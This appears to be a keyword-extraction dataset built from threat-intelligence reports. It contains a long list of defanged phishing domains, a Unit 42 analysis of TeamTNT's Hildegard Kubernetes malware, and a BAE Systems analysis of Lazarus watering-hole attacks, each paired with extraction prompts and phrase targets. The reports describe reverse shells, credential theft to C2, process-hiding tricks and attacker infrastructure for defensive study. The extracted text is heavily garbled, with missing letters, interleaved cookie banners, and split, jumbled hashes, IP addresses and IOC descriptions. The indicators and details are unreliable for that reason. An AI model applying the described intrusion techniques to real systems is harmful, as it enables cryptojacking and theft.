myaccount-my-mail-gmail[.]com myaccount-oauths[.]ru myaccounts-auth[.]ru myaccounts-mail-passport[.]ru myaccounts-my-mail-gmail[.]com no-reply-gosuslugi[.]ru oauth-login-account-mail[.]ru oauth-login-accounts-mail[.]ru permission-community-experience[.]ru permission-community-manager[.]ru permission-community-place[.]ru permission-community-preference[.]ru permission-community-types[.]ru permission-experience-manager[.]ru permission-experience-preference[.]ru permission-manager-community[.]ru permission-manager-experience[.]ru permission-manager-place[.]ru permission-manager-preference[.]ru permission-manager-smartlink[.]ru permission-manager-types[.]ru20/27permission-my-community[.]ru permission-my-experience[.]ru permission-my-manager[.]ru permission-my-place[.]ru permission-my-preference[.]ru permission-my-safe[.]ru permission-my-smartlink[.]ru permission-my-source[.]ru permission-my-types[.]ru permission-online-experience[.]ru permission-online-manager[.]ru permission-online-place[.]ru permission-online-preference[.]ru permission-online-types[.]ru permission-place-community[.]ru permission-place-experience[.]ru permission-place-manager[.]ru permission-place-smartlink[.]ru permission-place-types[.]ru permission-place[.]ru permission-preference-manager[.]ru permission-preference-types[.]ru permission-safe-experience[.]ru permission-safe-manager[.]ru permission-safe-place[.]ru permission-safe-preference[.]ru permission-safe-types[.]ru permission-safety-experience[.]ru permission-safety-manager[.]ru permission-safety-place[.]ru permission-safety-preference[.]ru permission-safety-smartlink[.]ru permission-safety-types[.]ru permission-smartlink-experience[.]ru permission-smartlink-manager[.]ru permission-smartlink-preference[.]ru permission-smartlink-types[.]ru permission-smartlink[.]ru permission-source-manager[.]ru permission-source-preference[.]ru permission-types-place[.]ru place-community-experience[.]ru place-community-manager[.]ru place-community-permission[.]ru21/27place-community-safe[.]ru place-community-safety[.]ru place-community-smartlink[.]ru place-community-source[.]ru place-community-types[.]ru place-community[.]ru place-experience-community[.]ru place-experience-manager[.]ru place-experience-permission[.]ru place-experience-place[.]ru place-experience-safe[.]ru place-experience-safety[.]ru place-experience-source[.]ru place-experience-types[.]ru place-experience[.]ru place-manager-community[.]ru place-manager-permission[.]ru place-manager-safe[.]ru place-manager-safety[.]ru place-manager-smartlink[.]ru place-manager-source[.]ru place-manager-types[.]ru place-manager[.]ru place-my-community[.]ru place-my-experience[.]ru place-my-manager[.]ru place-my-permission[.]ru place-my-preference[.]ru place-my-safe[.]ru place-my-smartlink[.]ru place-my-types[.]ru place-online-community[.]ru place-online-experience[.]ru place-online-manager[.]ru place-online-permission[.]ru place-online-safety[.]ru place-online-smartlink[.]ru place-online-source[.]ru place-online-types[.]ru place-permission-community[.]ru place-permission-experience[.]ru place-permission-safety[.]ru place-permission-smartlink[.]ru place-permission-source[.]ru22/27place-permission-types[.]ru place-permission[.]ru place-preference-community[.]ru place-preference-experience[.]ru place-preference-manager[.]ru place-preference-place[.]ru place-preference-safe[.]ru place-preference-smartlink[.]ru place-preference-source[.]ru place-preference-types[.]ru place-preference[.]ru place-safe-community[.]ru place-safe-experience[.]ru place-safe-manager[.]ru place-safe-permission[.]ru place-safe-safety[.]ru place-safe-smartlink[.]ru place-safe-source[.]ru place-safe-types[.]ru place-safety-community[.]ru place-safety-experience[.]ru place-safety-permission[.]ru place-safety-smartlink[.]ru place-safety-source[.]ru place-safety-types[.]ru place-smartlink-community[.]ru place-smartlink-experience[.]ru place-smartlink-manager[.]ru place-smartlink-preference[.]ru place-smartlink-safe[.]ru place-smartlink-safety[.]ru place-smartlink-source[.]ru place-smartlink-types[.]ru place-smartlink[.]ru place-source-community[.]ru place-source-experience[.]ru place-source-permission[.]ru place-source-safety[.]ru place-source-smartlink[.]ru place-types-community[.]ru place-types-experience[.]ru place-types-permission[.]ru place-types-smartlink[.]ru preference-community-experience[.]ru23/27preference-community-manager[.]ru preference-community-place[.]ru preference-manager-community[.]ru preference-manager-experience[.]ru preference-manager-permission[.]ru preference-manager-smartlink[.]ru preference-manager-types[.]ru preference-my-manager[.]ru preference-my-permission[.]ru preference-my-source[.]ru preference-online-manager[.]ru preference-online-permission[.]ru preference-online-place[.]ru preference-online-types[.]ru preference-permission-place[.]ru preference-permission[.]ru preference-place-community[.]ru preference-place-smartlink[.]ru preference-place-types[.]ru preference-safe-experience[.]ru preference-safe-manager[.]ru preference-safe-place[.]ru preference-safety-permission[.]ru preference-safety-place[.]ru preference-smartlink-experience[.]ru preference-smartlink-permission[.]ru preference-smartlink-place[.]ru preference-source-experience[.]ru preference-source-permission[.]ru preference-source-place[.]ru preference-types-place[.]ru safe-manager-experience[.]ru safe-manager-smartlink[.]ru safe-online-experience[.]ru safe-permission-experience[.]ru safe-permission-source[.]ru safe-place-community[.]ru safe-place-experience[.]ru safe-place-permission[.]ru safe-place-preference[.]ru safe-place-smartlink[.]ru safe-safety-experience[.]ru safe-smartlink-experience[.]ru safe-source-experience[.]ru24/27safety-community-source[.]ru safety-manager-source[.]ru safety-my-smartlink[.]ru safety-permission-community[.]ru safety-place-community[.]ru safety-place-experience[.]ru safety-place-permission[.]ru safety-place-preference[.]ru safety-place-smartlink[.]ru safety-preference-experience[.]ru safety-preference-source[.]ru safety-smartlink-source[.]ru security-my-account[.]ru security-myaccount[.]ru security-myaccounts[.]ru smartlink-communit-safety[.]ru smartlink-experience-place[.]ru smartlink-experience[.]ru smartlink-manager-permission[.]ru smartlink-manager-place[.]ru smartlink-manager-safety[.]ru smartlink-manager-types[.]ru smartlink-manager[.]ru smartlink-my-manager[.]ru smartlink-my-permission[.]ru smartlink-my-place[.]ru smartlink-my-safe[.]ru smartlink-my-safety[.]ru smartlink-my-source[.]ru smartlink-online-permission[.]ru smartlink-online-place[.]ru smartlink-online-safety[.]ru smartlink-online-types[.]ru smartlink-permission-community[.]ru smartlink-permission-experience[.]ru smartlink-permission-safety[.]ru smartlink-permission-source[.]ru smartlink-permission[.]ru smartlink-place-community[.]ru smartlink-place-manager[.]ru smartlink-place-permission[.]ru smartlink-place-types[.]ru smartlink-place[.]ru smartlink-safe-manager[.]ru25/27smartlink-safe-permission[.]ru smartlink-safe-place[.]ru smartlink-safe-safety[.]ru smartlink-safe-types[.]ru smartlink-safety-place[.]ru smartlink-safety-types[.]ru smartlink-source-manager[.]ru smartlink-source-permission[.]ru smartlink-source-place[.]ru smartlink-source-safety[.]ru smartlink-types-place[.]ru smartlink-types[.]ru source-community-preference[.]ru source-experience-preference[.]ru source-place-community[.]ru source-place-experience[.]ru source-place-permission[.]ru source-place-preference[.]ru source-place-smartlink[.]ru source-safe-preference[.]ru source-safety-preference[.]ru source-source-preference[.]ru types-community-experience[.]ru types-community-permission[.]ru types-community-place[.]ru types-community-preference[.]ru types-community[.]ru types-experience-place[.]ru types-experience[.]ru types-manager-permission[.]ru types-manager-place[.]ru types-manager-preference[.]ru types-manager-smartlink[.]ru types-my-permission[.]ru types-my-place[.]ru types-my-smartlink[.]ru types-online-community[.]ru types-online-experience[.]ru types-online-permission[.]ru types-online-place[.]ru types-online-preference[.]ru types-online-smartlink[.]ru types-palce-experience[.]ru types-palce-smartlink[.]ru26/27types-permission-experience[.]ru types-permission-place[.]ru types-place-community[.]ru types-place-experience[.]ru types-place-permission[.]ru types-place-preference[.]ru types-place-smartlink[.]ru types-place[.]ru types-preference-experience[.]ru types-preference-place[.]ru types-safe-experience[.]ru types-safe-smartlink[.]ru types-safety-experience[.]ru types-safety-smartlink[.]ru types-smartlink-community[.]ru types-smartlink-experience[.]ru types-smartlink-manager[.]ru types-smartlink-place[.]ru types-smartlink[.]ru yandex-account-mail-passport[.]ru yandex-account-passport[.]ru yandex-accounts-mail-passport[.]ru yandex-auth-passport[.]ru yandex-my-account-passport[.]ru yandex-my-accounts-passport[.]ru yandex-my-passport-accounts[.]ru yandex-my-profile-passport[.]ru yandex-myaccount-mail-passport[.]ru yandex-myaccount-passport[.]ru yandex-myaccounts-mail-passport[.]ru yandex-myaccounts-passport[.]ru yandex-mypassport-account[.]ru yandex-mypassport-accounts[.]ru yandex-myprofile-passport[.]ru yandex-oauth-passport[.]ru yandex-passport-my-account[.]ru yandex-profile-passport[.]ru27/27 ","{'phrases': ['Void Balaur', 'domains', 'use', 'patterns', 'services', 'the group', 'Phishing emails', 'targets', 'theme', 'details', 'the target', 'links', 'credentials', 'accounts', 'multi-factor authentication', 'backup codes', 'access', 'social media', 'customers'], 'target': 'Void Balaur; domains; use; patterns; services; the group; Phishing emails; targets; theme; details; the target; links; credentials; accounts; multi-factor authentication; backup codes; access; social media; customers.'}"
TeamTNT; a misconfigured kubelet; anonymity; use; the tmate reverse shell; IP; The malware; commands; a foothold; Kubernetes; tens; thousands; exfiltrate data; credentials; techniques; persistence; the group; tools; ack.,"[' 1. Attacker gains initial access by exploiting unsecured Kubelet APIs that allow anonymous commands 2. Attacker executes commands on pods to download and run tmate reverse shell 3. Tmate shell used to scan and find other exploitable Kubelets using masscan 4. Malicious cryptojacking script xmr.sh deployed to containers on compromised Kubelets 5. Xmr.sh scripts execute xmrig to mine Monero cryptocurrency 6. Xmrig processes connect back to IRC C2 channel 7. Attacker establishes additional reverse shells to compromised containers for control 8. Tools gathered for container breakout, credential theft, and lateral movement ']","Extract the keywords: 2/6/2021Hildegard: New TeamTNT Malware Targeting KubernetesMenuHildegard: New TeamTNT Malware Targe ng Kubernetes7,352 people reacted 1410 min. readBy Jay Chen, Aviv Sasson and Ariel Zelivansky February 3, 2021 at 6:00 AM Category: Unit 42 Tags: Cloud, containers, cryptojacking, Docker, Kubernetes, public cloud, TeamTnTThis site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementThis post is also available in:(Japanese)SHARE Cookie Settingsurl New TeamTNT Malware Targeting KubernetesExecu ve SummaryIn January 2021, Unit 42 researchers detected a new malware campaign targe ng Kubernetes clusters. The a ackers gained ini al access via a misconﬁgured kubelet that allowed anonymous access. Once ge ng a foothold into a Kubernetes cluster, the malware a empted to spread over as many containers as possible and eventually launched cryptojacking opera ons. Based on the tac cs, techniques and procedures (TTP) that the a ackers used, we believe this is a new campaign from TeamTNT. We refer to this new malware as Hildegard, the username of the tmate account that the malware used.TeamTNT is known for exploi ng unsecured Docker daemons and deploying malicious container images, as documented in previous research (Cetus, Black-T and TeamTNT DDoS). However, this is the ﬁrst  me we found TeamTNT targe ng Kubernetes environments. In addi on to the same tools and domains iden ﬁed in TeamTNT’s previous campaigns, this new malware carries mul ple new capabili es that make it more stealthy and persistent. In par cular, we found that TeamTNT’s Hildegard malware:Uses two ways to establish command and control (C2) connec ons: a tmate reverse shell and anInternet Relay Chat (IRC) channel.Uses a known Linux process name (bioset) to disguise the malicious process.Uses a library injec on technique based on LD_PRELOAD to hide the malicious processes.Encrypts the malicious payload inside a binary to make automated sta c analysis more diﬃcult.We believe that this new malware campaign is s ll under development due to its seemingly incomplete codebase and infrastructure. At the  me of wri ng, most of Hildegard’s infrastructure has been online for only a month. The C2 domain borg[.]w  was registered on Dec. 24, 2020, the IRC server went online on Jan. 9, 2021, and some malicious scripts have been updated frequently. The malware campaign has ~25.05 KH/s hashing power, and there is 11 XMR (~$1,500) in the wallet.There has not been any ac vity since our ini al detec on, which indicates the threat campaign may s ll be in the reconnaissance and weaponiza on stage. However, knowing this malware’s capabili es and target environments, we have good reason to believe that the group will soon launch a larger-scale a ack. The malware can leverage the abundant compu ng resources in Kubernetes environments for cryptojacking and poten ally exﬁltrate sensi ve data from tens to thousands of applica ons running in the clusters.Palo Alto Networks customers running Prisma Cloud are protected from this threat by the Run me Protec on feature, Cryptominer Detec on feature and the Prisma Cloud Compute Kubernetes Compliance Protec on, which alerts on an insuﬃcient Kubernetes conﬁgura on and provides secure alterna ves.This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementCookie Settingsurl New TeamTNT Malware Targeting KubernetesFigure 1. A acker and malware’s movement.Tac cs, Techniques and ProceduresFigure 1 illustrates how the a acker entered, moved laterally and eventually performed cryptojacking in mul ple containers.1. The a acker started by exploi ng an unsecured Kubelet on the internet and searched for containers running inside the Kubernetes nodes. A er ﬁnding container 1 in Node A, the a acker a empted to perform remote code execu on (RCE) in container 1.2. The a acker downloaded tmate and issued a command to run it and establish a reverse shell to tmate.io from container 1. The a acker then con nued the a ack with this tmate session.3. From container 1, the a acker used masscan to scan Kubernetes’s internal network and found unsecured Kubelets in Node B and Node C. The a acker then a empted to deploy a malicious crypto mining script (xmr.sh) to containers managed by these Kubelets (containers 2-7).This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statement4. Containers that ran xmr.sh started an xmrig process and established an IRC channel back to the IRC C2.Cookie Settingsurl New TeamTNT Malware Targeting Kubernetes5. The a acker could also create another tmate session from one of the containers (container 4). With the reverse shell, the a acker could perform more manual reconnaissance and opera ons.The indicators of compromise (IOCs) found in each container are listed below. These ﬁles are either shell script or Executable Linkable Format (ELF). The IOC sec on at the end of the blog contains the hash and details of each ﬁle.Container 1: TDGG was dropped and executed via Kubelet. TDGG then subsequently downloaded and executed tt.sh, api.key and tmate. The a acker used the established tmate connec on to drop and run sGAU.sh, kshell, install_monerod.bash, setup_moneroocean_miner.sh and xmrig (MoneroOcean).Container 2-7: xmr.sh was dropped and executed via Kubelet.Container 4: The a acker also established a tmate session in this container. The a acker thendropped and executed pei.sh, pei64/32, xmr3.assi, aws2.sh, t.sh, tmate,x86_64.so, xmrig and xmrig.so.Figure 2 maps the malware campaign’s TTP to MITRE ATT&CK tac cs. The following sec ons will detail the techniques used in each stage.Figure 2. A acker’s tac cs, techniques and procedures.Ini al Accesskubelet is an agent running on each Kubernetes node. It takes RESTful requests from various components (mainly kube-apiserver) and performs pod-level opera ons. Depending on the conﬁgura on, kubelet may or may not accept unauthen cated requests. Standard Kubernetes deployments come with anonymous access to kubelet by default. However, most managed Kubernetes services such as Azure Kubernetes Service (AKS), Google Kubernetes Engine (GKE) and Kubernetes opera ons (Kops) all enforce proper authen ca on by default.This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementWe discovered that TeamTNT gained ini al access with the Hildegard malware by execu ng commands on kubelets that allow anonymous access. This was achieved by accessing the kubelet’s run commandCookie Settingsurl New TeamTNT Malware Targeting KubernetesAPI and execu ng commands on running containers.Execu onHildegard uses kubelet’s API to execute commands inside containers. The ini al commands create a tmate reverse shell that allows the a acker to carry out the subsequent opera on. Unlike the techniques that TeamTNT used in the past, this malware campaign did not pull or run any new container image.Privilege Escala onAlthough Unit 42 researchers have not observed an a empt to perform privilege escala on, the malware dropped two adversarial tools, Peirates and BOtB, which are capable of breaking out of containers via known vulnerabili es or accessing cloud resources via exposed cloud creden als.Container BreakoutBOtB can perform a container breakout using a known vulnerability such as CVE-2019-5736. It can also escape from privileged containers that have enabled CAPS and SYSCALLS.Access to Cloud ResourcesPeirates can gather mul ple infrastructures and cloud creden als. It looks for iden ty and access management (IAM) creden als from cloud metadata services and service account tokens from the Kubernetes clusters. With the iden ﬁed creden als, it then further a empts to move laterally or gain control of the cluster. While we observed Peirates in use, the container it was executed in had no creden als.Defense EvasionLibrary Injec on Hildegard uses LD_PRELOAD to hide the malicious process launched inside the containers. The malware modiﬁed the /etc/ld.so.preload ﬁle to intercept shared libraries’ imported func ons. In par cular, the malware overwrites two func ons: readdir() and readdir64(), which are responsible for returning the directory entries in the ﬁle system. The overwri en func ons ﬁlter out queries made to directory entries under /proc. The func ons then drop queries with keywords such as tmate, xmrig and ziggy. This way, when applica ons try to iden fy the running processes (by reading ﬁles under /proc) in the containers, tmate, xmrig and ziggy will not be found. Linux tools such as ps, top and many other container monitoring tools will be blinded from these malicious processes.This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementCookie Settingsurl New TeamTNT Malware Targeting KubernetesFigure 3. Func on that overwrites readdir64() in X86_64.so.Encrypted ELF BinaryHildegard deploys an IRC agent built from the open-source project ziggystartux. To avoid being detected by automated sta c analysis tools, the ziggystartux ELF is encrypted and packed in another binary (ziggy). When the binary is executed, the ziggystartux ELF is decrypted by a hardcoded Advanced Encryp on Standard (AES) key and executed in memory.This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementFigure 4. Unpacking and execu ng the payload.Cookie Settingsurl New TeamTNT Malware Targeting KubernetesDisguised Process Name The malware names the IRC process “bioset”, which is the name of a well-known Linux kernel process bioset. If one is only looking at the names of the running processes on a host, one can easily overlook this disguised process.DNS Monitoring Bypass The malware modiﬁes the system DNS resolvers and uses Google’s public DNS servers to avoid being detected by DNS monitoring tools.Figure 5. DNS resolver modiﬁca on.Delete Files and Clear Shell History All the scripts are deleted immediately a er being executed. TeamTNT also uses the “history -c” command to clear the shell log in every script.Figure 6. The script clears the history and deletes itself.Creden al AccessHildegard searches for creden al ﬁles on the host, as well as queries metadata for cloud-speciﬁc creden als. The iden ﬁed creden als are sent back to the C2.The searched creden als include:Cloud access keys. This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you Cloud access tokens. personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementCookie Settingsurl New TeamTNT Malware Targeting KubernetesFigure 8. The script looks for system and network informa on.Lateral MovementHildegard mainly uses the unsecured kubelet to move laterally inside a Kubernetes cluster. During the discovery stage, the malware ﬁnds the exploitable kubelets and the containers these kubelets manage. The malware then creates C2 channels (tmate or IRC) and deploys malicious crypto miners in these containers. Although not observed by Unit 42 researchers, the a acker may also move laterally with the stolen creden als.Command and ControlOnce gaining the ini al foothold into a container, Hildegard establishes either a tmate session or an IRC channel back to the C2. It is unclear how TeamTNT chooses and tasks between these two C2 channels, as both can serve the same purpose. At the  me of wri ng, tmate sessions are the only way the a acker interacts with the compromised containers. Unit 42 researchers have not observed any commands in the IRC channel. However, the IRC server’s metadata indicates that the server was deployed on Jan. 9, 2021, and there are around 220 clients currently connected to the server.Figure 9. Tmate named session created by the malware.Figure 10. The IRC servers are hardcoded in the ziggy binary.This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementCookie Settingsurl New TeamTNT Malware Targeting KubernetesFigure 11.The IRC traﬃc captured at the IRC client.ImpactThe most signiﬁcant impact of the malware is resource hijacking and denial of service (DoS). The cryptojacking opera on can quickly drain the en re system’s resources and disrupt every applica on in the cluster. The xmrig mining process joins the supportxmr mining pool using the wallet address 428uyvSqdpVZL7HHgpj2T5SpasCcoHZNTTzE3Lz2H5ZkiMzqayy19sYDcBGDCjoWbTfLBnc3tc9 rG4Y8gXQ8fJiP5tqeBda. At the  me of wri ng, the malware campaign has ~25.05 KH/s hashing power and there is 11 XMR (~$1,500) in the wallet.Figure 12. Mining ac vity on supportxmr.ConclusionThis site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementCookie Settingsurl New TeamTNT Malware Targeting KubernetesUnlike a Docker engine that runs on a single host, a Kubernetes cluster typically contains more than one host and every host can run mul ple containers. Given the abundant resources in a Kubernetes infrastructure, a hijacked Kubernetes cluster can be more proﬁtable than a hijacked Docker host. This new TeamTNT malware campaign is one of the most complicated a acks targe ng Kubernetes. This is also the most feature-rich malware we have seen from TeamTNT so far. In par cular, the threat actor has developed more sophis cated tac cs for ini al access, execu on, defense evasion and C2. These eﬀorts make the malware more stealthy and persistent. Although the malware is s ll under development and the campaign is not yet widely spread, we believe the a acker will soon mature the tools and start a large-scale deployment.Palo Alto Networks customers running Prisma Cloud are protected from this threat by the Run me Protec on features, Cryptominer Detec on and by the Prisma Cloud Compute Kubernetes Compliance Protec on, which alerts on an insuﬃcient Kubernetes conﬁgura on and provides secure alterna ves.Figure 13. Prisma Cloud Compute Kubernetes compliance protec ons.Figure 14. Prisma Cloud Compute aler ng on crypto mining incident.Indicators of CompromiseDomains/IPs:Descrip onDomain/IP This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you Cookie Settings The.borg[.]w  This machine hosts malicious ﬁles used in the campaign and receives the acknowledge the use of cookies. Privacy statementcollected data to this C2.url New TeamTNT Malware Targeting Kubernetes(45.9.150[.]36 )Hosted ﬁles: TDGG, api.key, tmate,  .sh, sGAU.sh, t.sh, x86_64.so, xmr.sh, xmrig, xmrig.so, ziggy, xmr3.assi147.75.47[.]1 99teamtnt[.]red (45.9.148[.]10 8)Borg[.]w  (45.9.148[.]10 8)irc.borg[.]w  (123.245.9[.]1 47)sampwn.anon dns[.]net (13.245.9[.]14 7)164.68.106[.] 9662.234.121[.] 105Files:SHA256The malware connects to this IP to obtain the vic m host’s public IP.This host hosts malicious scripts and binaries. Hosted ﬁles: pei.sh, pei64.This host hosts malicious scripts and binaries. Hosted ﬁles: aws2.shThis host is one of the C2s. It runs an IRC server on port 6667.This host is one of the C2s. It runs an IRC server on port 6667.This host is one of the C2s. It runs an IRC server on port 6667.This host is one of the C2s. It runs an IRC server on port 6667.File NameTyp tThis script downloads and executes tThis site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you b34df4b273b3bedaab531be4 acknowledge the use of cookies. Privacy statement 6a0780d97b87588e93c1818api.keyThis script downloads and runs tmate. It collects system informa on from the vic m’s host and sends the collected data to C2(45.9.150[.]36)textThe API key is used for crea ng a named tmate session from theCookie Settingsurl New TeamTNT Malware Targeting Kubernetes158a47f7add8c7204compromised containers.d2ﬀf992e40ce18ﬀ81b9a92fa 1cb93a56 5a82c1cc428204 552d8dfa1bc04ftmateELFtmate v2.4.074e3ccaea4df277e1a9c458a6 tThis script downloads and installs masscan. It scans Kubernetes’ internal IP Kubelets running on port 10250. If masscan ﬁnds an exploitable Kubelet, it a empts to download and execute a cryptojacking script in all the tThe script performs remote code execu on in containers via Kubelet’s API. It also downloads and executes xmr.sh in a target tThe script is hosted in this Github repo. It pulls and builds the oﬃcial monero project. It then creates a user named “monerodaemon” and starts the monero service.The script is hosted in this Github repo. It pulls and runs the MoneroOcean advanced version of (oneroocean)ELFxmrig 6.7.2-mo3. This binary is hosted in MoneroOcean/xmrig Github repo.ee6dbbf85a3bb301a2e448c7f tThis script downloads and executes pei64 or pei32, depending on the host’s architecture.937842811b9e2eb87c4c193 54a1a790315f2669eea58b63 264f751de4da5438dpei64ELFThis is a Kubernetes penetra on tool from the peirates project. The tool is capable of escala ng privilege and pivo ng through the Kubernetes cluster.This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you 72cﬀ62d801c5bcb185aa299e acknowledge the use of cookies. Privacy statement b26f417aad843e617cf9c39c6pei32ELFSame as pei64, but for i686 architecture.Cookie Settingsurl New TeamTNT Malware Targeting Kubernetes12c5c5d556394aa107a43314 tThe script downloads and runs aws2.sh, t.sh and xmrig.053318adb15cf23075f737da tThe script searches for cloud creden als and sends the iden ﬁed creden als to C2 (the.borg[.]w ).e6422d97d381f255cd9e9f91 tThe script downloads x86_64.so and tmate from C2. It modiﬁes ld.so.preload and starts a tmate named session. It then sends back the vic m’s system info and tmate session to C2.77456c099facd775238086e8 f9420308be432d461e55e49e 1b24d96a8ea585e8x86_64.soELFThis shared object replaces the exis ng /etc/ld.so.preload ﬁle. It uses the LD_PRELOAD trick to hide the tmate process.78f92857e18107872526feb1 ae834edb9b7189df4a2129a4 125a3dd8917f9983xmrigELFxmrig v6.7.03de32f315fd01b7b741c b7 dfee22c30bf7b9a5a01d7ab66 90fcb42759a3e9fxmrig.soELFThis shared object replaces the exis ng /etc/ld.so.preload. It uses the LD_PRELOAD trick to hide the xmrig process.fe0f5fef4d78db808b9dc4e63 tThe script downloads and executes xmrig and ziggy.74f122 0059977167c5ed34 a7e217d9dfe8e8199020e3fe 19532be108a7d607ziggyELFziggy is a binary that packs an encrypted ELF. The binary decrypts the ELF at run me and runs it in the memory. The encrypted ELF is built from ZiggyStarTux, an IRC client for embedded devices.This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementCookie Settingsurl New TeamTNT Malware Targeting KubernetesGet updates from Palo Alto Networks!Sign up to receive the latest news, cyber threat intelligence and research from usEmail addressSubscribeI'm not a robotreCAPTCHA Privacy - TermsBy submi ng this form, you agree to our Terms of Use and acknowledge our Privacy Statement. Popular ResourcesResource CenterBlogCommuni esTech DocsUnit 42SitemapLegal NoticesPrivacyTerms of UseDocumentsThis site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementAccountManage Subscrip onsurl Settings15/162/6/2021Manage Subscrip onsReport a VulnerabilityHildegard: New TeamTNT Malware Targeting Kubernetes© 2021 Palo Alto Networks, Inc. All rights reserved.This site uses cookies essential to its operation, for analytics, and for personalized content and ads. By continuing to browse this site, you acknowledge the use of cookies. Privacy statementCookie Settingsurl ","{'phrases': ['exploi', 'API', 'commands', 'execu', 'Run', 'tmate reverse shell', 'Use', 'Kubelets', 'masscan', 'cryptojacking', 'IP', 'xmr.sh', 'Xmrig', 'mine', 'Monero', 'IRC', 'C2', 'compromised containers', 'control', 'Tools', 'container breakout', 'lateral movement'], 'target': 'exploi; API; commands; execu; Run; tmate reverse shell; Use; Kubelets; masscan; cryptojacking; IP; xmr.sh; Xmrig; mine; Monero; IRC; C2; compromised containers; control; Tools; container breakout; lateral movement.'}"
the attacker; the website; Polish Financial Supervision Authority; visitors; malicious JavaScript files; links; the files; a DLL; Install; the DLL; persistence; the malware; Execute; the dropper; data; the RC4; the RC4; C2; 10; 11; malicious JavaScript; 11; 12; the attackers; the attack.,"['1. Financial websites are compromised to direct visitors to download malware. 2. Malicious JavaScript on compromised sites loads exploits targeting Silverlight and Flash. 3. Exploits deliver first stage malware that gathers system info. 4. Second stage malware receives commands from a C2 server. 5. Whitelisted IP ranges indicate banks in specific countries are targeted. 6. Malware allows compromise of financial networks, with an unknown end goal. ']","Extract the keywords: 2⼀»BAE SYSTEMS THREAT RESEARCHBLOG⽴ ⼊Resources Contact usHomeProductsSolutionsNews & EventsPartnersAbout UsCareersSEARCHTHREAT RESEARCH BLOGHome » Threat Research » Lazarus & Watering-hole attacksPosted by BAE Systems Applied Intelligence - Sunday, 12 February 2017 LAZARUS & WATERING-HOLE ATTACKSOn 3rd February 2017, researchers at badcyber.com released an article that detailed a series of attacks directed at Polish financial institutions. The article is brief, but states that ""This is – by far – the most serious information security incident we have seen in Poland"" followed by a claim that over 20 commercial banks had been confirmed as victims.This report provides an outline of the attacks based on what was shared in the article, and our own additional findings.ANALYSISAs stated in the blog, the attacks are suspected of originating from the website of the Polish Financial Supervision Authority (knf.gov[.]pl), shown below:From at least 2016-10-07 to late January the website code had been modified to cause visitors to download malicious JavaScript files from the following locations:hxxp://sap.misapor[.]ch/vishop/view.jsp?pagenum=1 hxxps://www.eye-watch[.]in/design/fancybox/Pnf.actionBoth of these appear to be compromised domains given they are also hosting legitimate content and have done for some time. The malicious JavaScript leads to repositories. At the moment we cannot verify that it originated from the watering-hole KB)2017-01- 26 07:46:24PLThe file is packed with a commercial packer known as 'Enigma Protector'. Once unpacked it drops a known malware variant, which has been seen as part of the Lazarus group’s toolkit in other cases over the past year.The unpacked executable takes several command line arguments:-l: list service names, available for its own registration -o: open specified event -t: set specified event -x [PASSWORD] -e [SERVICE_NAME]: drop/install DLL under specified [SERVICE_NAME] -x [PASSWORD] -f [SERVICE_NAME]: recreate the keys that keep the password for the next stage DLL, under the specified [SERVICE_NAME]The provided password's MD5 hash is used as an RC4 password. On top of that, there is one more RC4-round, using a hard coded 32-byte RC4 password:53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15Once the data is decrypted with two RC4 rounds, the dropper checks the decrypted data contains a valid 4-byte signature: 0xBC0F1DAD.WATERING HOLE ANALYSISThe attacker content on the compromised sap.misapor[.]ch site was not accessible at the time of writing. However, archived versions of some pages can be found:url r.ch/Default.html url r.ch/Silverlight.jsThe Default.html contains code to load MisaporPortalUI.xap – a Silverlight application which likely would contain the malicious first-stage implant. This is unfortunately not available for analysis currently.<div id=""silverlightControlHost""><object data=""data:application/x-silverlight,"" type=""application/x-silverlight-2"" width=""100%"" height=""100%""> <param name=""source"" value=""ClientBin/MisaporPortalUI.xap? <param name=""onerror"" value=""onSilverlightError"" /> <param name=""background"" value=""white"" /> <param name=""minRuntimeVersion"" value=""3.0.40624.0"" /> <param name=""autoUpgrade"" value=""true"" /> <a href=""/web/20170203175640/url LinkID=149156&v=3.0.40624.0"" style=""text-decoration: none;""> <img src=""/web/20170203175640im_/url LinkId=108181"" alt=""Get Microsoft Silverlight"" style=""border- <iframe id='_sl_historyFrame' style='visibility:hidden;height:0;width:0;border:0px'> </iframe> </div>ADDITIONAL WATERING HOLESThe eye-watch[.]in domain appears to have been used in watering-hole attacks on other financial sector websites. On 2016-11-08 we observed connections to the site referred from:hxxp://www.cnbv.gob[.]mx/Prensa/Paginas/Sanciones.aspxThis is the page for the Comisión Nacional Bancaria y de Valores (National Banking and Stock Commission of Mexico), specifically the portion of their site that details sanctions made by the Mexican National Banking Commission. This organisation is the Mexican banking supervisor and the equivalent of Poland's KNF.In this instance the site redirected to the following URL:hxxp://www.eye-watch[.]in/jscroll/images/images.jsp?pagenum=1At the time of writing the compromise is no longer present and no archived versions of the page exist to show where the compromise was located.A further instance of the malicious code appears to have been present on a bank website in Uruguay around 2016-10-26 when a PCAP of browsing to the website was uploaded to VirusTotal.com.This shows a GET request made to:hxxp://brou.com[.]uyFollowed shortly after by connections to:www.eye-watch[.]in:443Unfortunately, the response was empty and it is not possible to assess what may have been delivered.ADDITIONAL MALWARE AND EXPLOIT 